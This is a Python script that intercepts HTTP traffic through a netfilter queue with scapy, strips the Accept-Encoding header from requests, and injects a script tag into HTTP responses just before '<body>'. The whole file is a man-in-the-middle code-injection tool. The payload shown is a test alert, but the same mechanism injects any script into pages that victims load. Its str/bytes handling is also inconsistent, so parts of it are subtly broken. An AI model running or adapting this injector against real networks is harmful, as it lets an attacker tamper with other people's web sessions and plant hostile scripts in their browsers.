#!/usr/bin/env python

import scapy.all as scapy
import netfilterqueue
import re


def set_load(packet, payload):
    packet[scapy.Raw].load = payload
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(pkt):
    scapy_packet = scapy.IP(pkt.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] HTTP Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load.decode('utf-8', errors='ignore'))
            # to search the content length value in request:
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            # (?:....) to locate the regrex keywords
            if content_length_search:
                content_length = content_length_search.group(1)
                print(content_length)
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] HTTP Response")
            load = bytes(load.replace(b"<body>", b"<script>alert('test')</script><body>"))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            pkt.set_payload(bytes(new_packet))

    pkt.accept()


def packet_show(pkt):
    print("[+] Printing Packets")
    scapy_pkt = scapy.IP(pkt.get_payload())
    print(scapy_pkt.show())


try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n \n [+] Detected ctrl+c ... Quitting ...!!!")
